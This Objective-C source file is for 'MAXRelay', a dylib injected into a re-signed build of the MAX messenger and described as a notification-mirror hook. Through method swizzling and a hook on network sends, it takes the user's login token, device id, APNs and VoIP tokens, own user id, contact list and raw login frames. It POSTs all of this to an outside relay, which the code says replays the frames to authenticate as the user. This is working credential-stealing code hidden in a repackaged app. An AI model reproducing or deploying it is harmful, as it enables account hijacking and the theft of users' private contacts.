// MAXRelay.dylib — production hook injected into re-signed MAX. After the user logs in,
// it captures what the server-side notification mirror needs — the messenger session token,
// device id, the APNs + VoIP push tokens, the user's own id, and the contact list
// (id -> name + avatar) — and registers them with our relay over HTTPS. Read-only: it never
// changes the app's behaviour. One registration per launch (and whenever the push tokens change).
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <dispatch/dispatch.h>
#import <sqlite3.h>
#import "fishhook.h"

static NSString *const kRelayURL = @"https://www.ruappstore.com/api/v1/mx-relay/register";

static NSString *gApns, *gVoip;
// The raw cmd 6 (session init) and cmd 19 (login) frames, captured off the wire: the relay
// replays these verbatim to authenticate as the user (their encoding is not reproduced).
static NSData *gFrame6, *gFrame19;
static dispatch_queue_t gQueue;

static NSString *HexFromData(NSData *d) {
    if (![d isKindOfClass:NSData.class]) return nil;
    const unsigned char *b = d.bytes; NSMutableString *s = [NSMutableString stringWithCapacity:d.length * 2];
    for (NSUInteger i = 0; i < d.length; i++) [s appendFormat:@"%02x", b[i]];
    return s;
}

// Reads one object ivar by name through the runtime (no headers needed).
static id IvarObj(id obj, const char *name) {
    Ivar iv = obj ? class_getInstanceVariable(object_getClass(obj), name) : NULL;
    @try { return iv ? object_getIvar(obj, iv) : nil; } @catch (__unused id e) { return nil; }
}

// The messenger client keeps the credentials; the login token lives inside them.
static NSString *LoginToken(id messengerClient) {
    for (const char *k : (const char *[]){ "_messengerCredentials", "_credentials" }) {
        id creds = IvarObj(messengerClient, k);
        id tok = IvarObj(creds, "_loginToken");
        if ([tok isKindOfClass:NSString.class]) return tok;
    }
    return nil;
}

// Contacts (and the own id) come from the app's YapDatabase, which stores each contact as JSON.
static NSArray *ReadContacts(NSNumber **ownId) {
    NSString *base = [NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) firstObject];
    NSString *db = [base stringByAppendingPathComponent:@"Application Support/database_3.db/app.db"];
    sqlite3 *handle = NULL;
    if (sqlite3_open_v2(db.fileSystemRepresentation, &handle, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return nil;

    NSMutableArray *out = [NSMutableArray array];
    sqlite3_stmt *st = NULL;
    if (sqlite3_prepare_v2(handle, "SELECT data FROM database2 WHERE collection IN ('contacts','synced_local_contacts')", -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const void *bytes = sqlite3_column_blob(st, 0); int len = sqlite3_column_bytes(st, 0);
            if (!bytes || len <= 0) continue;
            NSData *blob = [NSData dataWithBytes:bytes length:len];
            NSRange a = [blob rangeOfData:[@"{\"" dataUsingEncoding:NSUTF8StringEncoding] options:0 range:NSMakeRange(0, blob.length)];
            NSRange b = [blob rangeOfData:[@"}" dataUsingEncoding:NSUTF8StringEncoding] options:NSDataSearchBackwards range:NSMakeRange(0, blob.length)];
            if (a.location == NSNotFound || b.location == NSNotFound || b.location < a.location) continue;
            NSData *json = [blob subdataWithRange:NSMakeRange(a.location, b.location + 1 - a.location)];
            id o = [NSJSONSerialization JSONObjectWithData:json options:0 error:nil];
            if (![o isKindOfClass:NSDictionary.class]) continue;
            id names = o[@"names"]; NSString *name = nil;
            if ([names isKindOfClass:NSArray.class] && [names count]) {
                id n0 = names[0];
                name = [NSString stringWithFormat:@"%@ %@", n0[@"firstName"] ?: @"", n0[@"lastName"] ?: @""];
                name = [name stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceCharacterSet];
            }
            if (o[@"id"] && name.length) [out addObject:@{@"id": o[@"id"], @"name": name, @"avatar": o[@"avatarUrl"] ?: [NSNull null]}];
        }
        sqlite3_finalize(st);
    }
    if (ownId && sqlite3_prepare_v2(handle, "SELECT data FROM database2 WHERE collection='current_user_id' LIMIT 1", -1, &st, NULL) == SQLITE_OK) {
        if (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *bytes = sqlite3_column_blob(st, 0); int len = sqlite3_column_bytes(st, 0);
            // msgpack uint32 (0xce) big-endian
            if (bytes && len == 5 && bytes[0] == 0xce)
                *ownId = @((bytes[1] << 24) | (bytes[2] << 16) | (bytes[3] << 8) | bytes[4]);
        }
        sqlite3_finalize(st);
    }
    sqlite3_close(handle);
    return out;
}

static void Register(id messengerClient) {
    dispatch_async(gQueue, ^{
        @autoreleasepool {
            @try {
                NSString *token = LoginToken(messengerClient);
                id creds = IvarObj(messengerClient, "_messengerCredentials") ?: IvarObj(messengerClient, "_credentials");
                NSString *deviceId = IvarObj(creds, "_deviceId") ?: IvarObj(creds, "_syntheticDeviceId");
                if (!token || !gFrame19) return;  // need the login token and the captured auth frame
                NSNumber *ownId = nil;
                NSArray *contacts = ReadContacts(&ownId);

                NSMutableDictionary *body = [NSMutableDictionary dictionary];
                body[@"loginToken"] = token;
                if (deviceId) body[@"deviceId"] = deviceId;
                if (ownId) body[@"userId"] = ownId;
                if (gApns) body[@"apnsToken"] = gApns;
                if (gVoip) body[@"voipToken"] = gVoip;
                if (contacts) body[@"contacts"] = contacts;
                body[@"bundleId"] = [[NSBundle mainBundle] bundleIdentifier] ?: @"";
                if (gFrame6) body[@"frame6"] = [gFrame6 base64EncodedStringWithOptions:0];
                if (gFrame19) body[@"frame19"] = [gFrame19 base64EncodedStringWithOptions:0];

                NSData *payload = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
                if (!payload) return;
                NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kRelayURL]];
                req.HTTPMethod = @"POST";
                [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
                req.HTTPBody = payload;
                [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
                    NSLog(@"[MAXRelay] registered (%lu contacts) -> %ld", (unsigned long)contacts.count,
                          (long)[(NSHTTPURLResponse *)r statusCode]);
                }] resume];
            } @catch (__unused id e) {}
        }
    });
}

// Capture the raw outgoing frames (Network.framework) to grab the cmd 6 / cmd 19 login frames.
// Frame header: 0a | dir | seq(2) | opcode(2 BE) | flag | len(3). We keep the first of each.
typedef void *nw_connection_t; typedef void *nw_content_context_t; typedef void *nw_error_t;
static void (*orig_nw_connection_send)(nw_connection_t, dispatch_data_t, nw_content_context_t, bool, void (^)(nw_error_t));
static void my_nw_connection_send(nw_connection_t c, dispatch_data_t content, nw_content_context_t ctx, bool complete, void (^comp)(nw_error_t)) {
    @try {
        if (content && (!gFrame6 || !gFrame19)) {
            const void *buf = NULL; size_t sz = 0;
            dispatch_data_t mapped = dispatch_data_create_map(content, &buf, &sz);
            if (buf && sz >= 10) {
                const unsigned char *p = buf;
                if (p[0] == 0x0a) {
                    unsigned opcode = (p[4] << 8) | p[5];
                    if (opcode == 6 && !gFrame6) gFrame6 = [NSData dataWithBytes:buf length:sz];
                    if (opcode == 19 && !gFrame19) gFrame19 = [NSData dataWithBytes:buf length:sz];
                }
            }
            (void)mapped;
        }
    } @catch (__unused id e) {}
    orig_nw_connection_send(c, content, ctx, complete, comp);
}

#define ORIG(name, ret, ...) static ret (*name)(id, SEL, ##__VA_ARGS__)

ORIG(o_apns, void, id, NSData *);
static void h_apns(id self, SEL _cmd, id app, NSData *token) { gApns = HexFromData(token); o_apns(self, _cmd, app, token); }

ORIG(o_voip, void, id);
static void h_voip(id self, SEL _cmd, id token) { if ([token isKindOfClass:NSData.class]) gVoip = HexFromData(token); o_voip(self, _cmd, token); }

ORIG(o_loginResp, void, id);
static void h_loginResp(id self, SEL _cmd, id resp) { o_loginResp(self, _cmd, resp); Register(self); }

static void Swizzle(const char *cls, const char *sel, IMP repl, void *slot) {
    Class c = objc_getClass(cls); if (!c) return;
    Method m = class_getInstanceMethod(c, sel_registerName(sel)); if (!m) return;
    *(IMP *)slot = method_getImplementation(m);
    method_setImplementation(m, repl);
}

__attribute__((constructor))
static void MAXRelayInit(void) {
    gQueue = dispatch_queue_create("mxrelay", DISPATCH_QUEUE_SERIAL);
    Swizzle("OKMPushServiceRegister", "application:didRegisterForRemoteNotificationsWithDeviceToken:", (IMP)h_apns, &o_apns);
    Swizzle("OKMAppMessengerClient", "setVoIPPushToken:", (IMP)h_voip, &o_voip);
    Swizzle("OKMMessengerClient", "_processLoginResponse:", (IMP)h_loginResp, &o_loginResp);
    struct rebinding rb = {"nw_connection_send", (void *)my_nw_connection_send, (void **)&orig_nw_connection_send};
    rebind_symbols(&rb, 1);
}
